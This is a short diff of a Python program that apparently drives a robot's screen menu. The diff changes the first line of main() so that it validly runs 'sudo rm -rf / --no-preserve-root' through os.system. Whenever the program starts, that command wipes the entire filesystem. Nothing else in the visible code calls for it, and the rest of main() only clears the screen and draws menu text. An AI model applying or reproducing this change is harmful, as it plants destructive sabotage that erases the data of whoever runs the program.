@@ -11,7 +11,7 @@ current = 0
 
 
 def main():
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     global current
     robot.screen.clear()
     robot.screen.draw_text(0, 0, run_options[current])
